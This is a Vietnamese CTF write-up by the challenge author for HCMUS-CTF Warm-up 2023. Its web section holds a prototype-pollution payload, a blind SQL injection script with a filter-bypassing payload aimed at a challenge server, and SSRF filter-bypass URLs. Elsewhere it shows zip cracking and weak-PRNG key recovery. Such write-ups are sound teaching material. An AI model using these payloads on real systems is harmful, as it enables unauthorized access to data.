---
title: HCMUS-CTF Warm-up 2023
date: 2023-02-22 11:06 +0700
tags: [ctf, web, forensics, misc]
categories: [CTF Writeups]
author: Dat2Phit
---

Đây là một số writeups cho các challenges mà mình ra ở HCMUS-CTF Warm-up 2023.


| Category | Challenge Name | Difficulty |
| -------- | -------------- | ---------- |
| Web      | Polluted Web   | Easy       |
| Web      | Have I Been Pwned   | Medium       |
| Web      | Cute Page 2   | Hard       |
| Forensics      | Know Your Sound   | Easy       |
| Forensics      | Craknarok   | Medium       |
| Forensics      | Black Market   | Hard       |
| Misc      | The Game Of Life   | Easy       |
| Misc      | Come on and jam   | Easy       |
| Misc      | Trace me  | Easy       |

## Polluted Web

### Exploit
Dùng burpsuite, bắt lại POST request và chỉnh lại header: Content-Type: `application/json` và chỉnh lại body như sau:
```json
{
    "name": "Dat2Phit",
    "opinion": "gdsfsd",
    "__proto__": {
        "flag": true
    },
    "flag":false
}
```
## Have I Been Pwned
### Preview

### Exploit script
Sử dụng binary search để tối ưu script
```python
import requests
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
from tqdm import tqdm
from time import perf_counter

session = requests.Session()
url = 'http://103.245.250.17:30007/'

length = 60
l = b2l(b'\x00' * length) # = 0
r = b2l(b'\xff' * length)

bar = tqdm(total=r.bit_length()) # O(logn) lol
t1_start = perf_counter()

while l < r:
  m = (l + r) // 2
  sent = hex(m).upper()[2:]

  bar.set_description(f"Testing: {l2b(m)}")
  payload = f"' OUNIONR (id = 1337 AND hex(password) > '{sent}') -UNION- -"
  res = session.post(url, {"password": payload})
  if 'safe.jpg' in res.text:
    r = m - 1
  else:
    l = m + 1
  bar.update(1)

t1_stop = perf_counter()
bar.close()
print("Elapsed time:", t1_stop - t1_start)

```
#### Output
![Exploit](https://i.imgur.com/9UbAdvX.png)
**Flag:** `HCMUS-CTF{SelECt_SeLEcT_Unt1l_y0U_G3t_th3_fl3g!!?!!??}`


## Cute Page 2
2 challenges này chủ yếu nhắm đến việc bypass filter để sử dụng SSRF (Server side request forgery) cho server gửi request đến /flag với IP là 127.0.0.1
### Challenge 1
```javascript
const hostWhiteList = [
  "www.youtube.com/watch",
  "kenhsinhvien.vn/topic",
  "www.w3schools.com/js",
  "info.cern.ch/hypertext",
  "gaia.cs.umass.edu/kurose_ross",
  "www.hcmus.edu.vn/component/content/",
];
const protocolWhiteList = ["http", "https"];

function filter(url) {
  let t = url.split("://", 2);
  let protocol = t[0];
  let host = t[1];

  if (
    !protocolWhiteList.some((p) => {
      return protocol.startsWith(p) && protocol.endsWith(p);
    })
  )
    return false;

  if (
    !hostWhiteList.some((h) => {
      return host.startsWith(h);
    })
  )
    return false;

  return true;
}

```
### Challenge 2
```javascript
function extremeFilter(url) {
  // Hardcoded filter lmaooo
  if (url.substring(0, 4) !== "http" || url.substring(7, 28) !== "picsum.photos/900/500" || url.includes('flag')) {
    return false;
  }
  return true;
}
```

### Final payload
#### Challenge 1:
```
 http:localhost:5000/flag#http://kenhsinhvien.vn/topic
```
or 
```
 http:/\localhost:5000/flag#http://kenhsinhvien.vn/topic

```
#### Challenge 2:
```
http:0/picsum.photos/900/500/../../../get?url=http://localhost/fl%61g
```
**Flag:** `HCMUS-CTF{55Rf_St4nD_f0r_5uP3r_s3CUr3d_rEqu3st_f0rg3Ry?}`
## Know Your Sound
### Part 1
Sử dụng Sonic Audio Visualizer mở file => Thêm layer Spectrogram vào sẽ thấy phần 1 của flag
![](https://i.imgur.com/Jn86PDa.png)

### Part 2
Hint: LSB (Least Significant Bit)
Dựa vào hint thì ta tìm thử các tool xem có tool nào có thể extract được LSB từ wav.
Thì có 1 tool gọi là [stegolsb](https://github.com/ragibson/Steganography)
Sư dụng module wavsteg:
```bash
stegolsb wavsteg -r -i mysterious.wav -o out -n 1 -b 30000
```
Kết quả sẽ ra cái hình:

![](https://i.imgur.com/TPOGCsT.jpg)
### Part 3
Chạy binwalk trên file wav sẽ thấy có file rick.jpg được dấu ở trong file.
![](https://i.imgur.com/1Ze61X6.png)

![](https://i.imgur.com/thu9T2D.jpg)

**Flag:** `HCMUS-CTF{4r3_You_5up3R_son1C_tH3_sT3G0s4uRu5sS5s55}`

## Craknarok
### John The Ripper
Use zip2john to get the hash from the zip file.
Use john with the rockyou.txt wordlist
![](https://i.imgur.com/yEbFuP8.png)

### Known Plaintext Attack

![](https://i.imgur.com/ErAwagn.png)
Sau đó vô confidential.pdf ctrl + A copy ra notepad sẽ có flag
![](https://i.imgur.com/dXNfLVC.png)

**Flag:** `HCMUS-CTF{H0w_D1d_y0U_Kn0W_Th3_P@ssW0rd????}`
## Black Market
### Ý tưởng
Chạy thử lệnh file và strings xem exe được viết bằng gì
```shell
$ file Bob.exe          
Bob.exe: PE32+ executable (console) x86-64, for MS Windows
```
```shell
$ strings Bob.exe -n 10 
...
bCrypto\Cipher\_chacha20.pyd
bCrypto\Cipher\_pkcs1_decode.pyd
bCrypto\Cipher\_raw_aes.pyd
bCrypto\Cipher\_raw_aesni.pyd
bCrypto\Cipher\_raw_arc2.pyd
bCrypto\Cipher\_raw_blowfish.pyd
bCrypto\Cipher\_raw_cast.pyd
bCrypto\Cipher\_raw_cbc.pyd
...
```
=> Bob.exe được viết bằng python
=> Dễ dàng reverse sử dụng [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) và [uncompyle6](https://pypi.org/project/uncompyle6/)

### pyinstxtractor
```shell
$ python pyinstxtractor.py Bob.exe 
[+] Processing Bob.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.8
[+] Length of package: 13373438 bytes
[+] Found 122 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: pyi_rth_win32api.pyc
[+] Possible entry point: pyi_rth_win32comgenpy.pyc
[+] Possible entry point: Bob.pyc
[+] Found 431 files in PYZ archive
[+] Successfully extracted pyinstaller archive: Bob.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

### uncompyle6
```shell
$ uncompyle6 -o . .\Bob.exe_extracted\Bob.pyc
# Successfully decompiled file
```
-> `Bob.py reversed from Bob.exe` 

### Đọc source và tìm cách giải
Sau khi đọc source thì ta có thể thấy rằng Bob và Alice đang thực hiện [Diffie-Hellman](https://viblo.asia/p/trao-doi-khoa-diffie-hellman-OREGwLNOelN) key exchange.
```python
random.seed(int(time.time()))
private_key = random.randrange(2, p)
client.sendall(package(p, LEN_PRIME) + package(g, LEN_GEN) + package(pow(g, private_key, p), LEN_PUB))

A = bytes_to_long(client.recv(LEN_PUB))
shared_secret = pow(A, private_key, p)
```
Ta thấy rằng private_key của Bob được tạo random dựa vào seed là thời gian lúc gửi. Nhưng seed được làm tròn thành số nguyên nên ta có thể đoán được seed dựa vào timestamp ở trong file pcap.

Sau khi có được shared_secret rồi thì chỉ cần cho vào hàm decrypt là xong.

Như vậy, ta chỉ cần sửa lại Bob.py:
* Chỉnh `int(time.time())` thành timestamp ở trong file pcap.
* Thay vì xuất ra màn hình sau khi nhận data thì ta save vào file luôn.
```python
good_stuffs = decrypt(shared_secret, data)
if hashlib.md5(good_stuffs).hexdigest() in whitelist:
    # print("That is some good stuffs for sure!")
    with open("sol.png", 'wb') as f:
        f.write(good_stuffs)
else:
    print("Goofy ahh stuffs :/")
```
Việc tiếp theo là chỉ cần mô phỏng lại cuộc trò chuyện giữa Bob và Alice bằng cách trích data ra từ file pcap và gửi lại cho Bob.

### Solve script
```python

import hashlib
import random
from binascii import unhexlify
import pyshark
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import bytes_to_long

def is_pkcs7_padded(message):
    padding = message[-message[-1]:]
    return all(padding[i] == len(padding) for i in range(0, len(padding)))

def decrypt(shared_secret: int, ciphertext: bytes):
    # Derive AES key from shared secret
    sha1 = hashlib.sha1()
    sha1.update(str(shared_secret).encode('ascii'))
    key = sha1.digest()[:16]
    iv = 16 * b'\x00'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    if is_pkcs7_padded(plaintext):
        return unpad(plaintext, 16)
    else:
        return plaintext

shark_cap = pyshark.FileCapture('conversation.pcap')
bob = []
alice = []
alice_port = None
for packet in shark_cap:
    if packet.tcp.srcport == "13337":
        if 'payload' in dir(packet.tcp):
            data = unhexlify("".join(packet.tcp.payload.split(':')).encode())
            bob.append(data)
    elif packet.tcp.srcport == "2688":
        if 'payload' in dir(packet.tcp):
            data = unhexlify("".join(packet.tcp.payload.split(':')).encode())
            alice.append(data)

LEN_PRIME = 1024
LEN_GEN = 16
LEN_PUB = 1024

random.seed(int(1674961797.326117000))

p, g, B = bob[0][:LEN_PRIME], bob[0][LEN_PRIME:LEN_PRIME + LEN_GEN], bob[0][-LEN_PUB:]
p, g, B = bytes_to_long(p), bytes_to_long(g), bytes_to_long(B)
A = bytes_to_long(alice[0])
private_key = random.randrange(2, p)
shared_secret = pow(A, private_key, p)
data = b"".join(alice[1:])
good_stuffs = decrypt(shared_secret, data)
print(len(good_stuffs))
with open("sol.png", 'wb') as f:
    f.write(good_stuffs)

```
### Flag
![Flag PNG](https://i.imgur.com/aPi6FoW.jpg)
**Flag:** `HCMUS-CTF{H3LLM4N_1S_UR_M1DDL3_N4M3}`
<br>

## The Game Of Life

File được cho có tên là game.rle
Mở thử thì ta thấy nội dung như sau:
```rle
x = 2404, y = 1658, rule = B3/S23
2$
1452bo$
1453bo3bo$
1444b2o2b2o8bo12b2o$
1444b2o2bo5b2o2bo12b2o$
1448bobo5b2o$
1449b2o3b3o2$
...
```
Nhìn qua thì chắc đây là một file liên quan đến pattern ở trong [Conway Game Of Life](https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life)
nên thử kiếm xem có trang web nào cho chạy không. Thì kiếm một hồi sẽ ra trang [copy.sh](https://copy.sh/life/)
Sau đó thì cứ import file vào và chạy thôi (nhớ tăng tốc độ)
![Flag](https://i.imgur.com/yqnYHc1.png)
**Flag:** `HCMUS-CTF{Th3_G4m3_0F_L1f3_1S_S0o0o0_C00ll!}`
<br>

## Come on and jam
Link: tinyurl.com/HCMUS-CTF-JAM
Tạo bản sao của Jamboard được dẫn đến.
Sao đó kéo các note ra sẽ lộ ra được cái một cái đường link.

Follow đường link sẽ dẫn đến trang pastebin.
Nhưng paste này đã được edit => đem lên [waybackmachine](https://archive.org/) sẽ có archive.

**Flag:** `HCMUS-CTF{1t'S_T1m3_t0_J4MMMM}`
## Trace me
Nội dung của file được cho:
```
bữa sáng.mỗi ngày.dệt vải
vật liệu.tầm với.tài năng
khe cửa.nồi gang.bãi tắm
ban đầu.hạ cánh.xa tít
cuộn dây.cánh quạt.tinh mơ
đèn bàn.sấy tóc.di sản
tạp dề.nhiếp ảnh.môi son
tài trí.cái thang.tẩm ướp
.
.
.
```
Description của challenge:
```
Dat3Phit told me to find him, but the only thing he gave me is this list containing seemingly random word triplets. Can you figure out what it means and trace him down for me?
```

Và hint của challenge được cho là: `Map`

Thoáng đọc qua cái file thì có vẻ vô nghĩa, nhưng dựa trên hint thì chắc mỗi dòng trong file thể hiện một toạ độ trên bản đồ.
Thử search google cụm từ `3 words map` thì kết quả trả về đầu tiên đó chính là trang [what3words](https://what3words.com/)

Login và chọn import list from csv => download template => copy & paste vô csv (nhớ lưu lại bằng UTF-8)

Import vào [what3words](https://what3words.com/) sẽ ra:
![](https://i.imgur.com/e4Ck4B2.png)
Scan QR sẽ ra flag.
**Flag:** `HCMUS-CTF{Bl@ckP1nk3R_1n_HCMUS!}`
<br>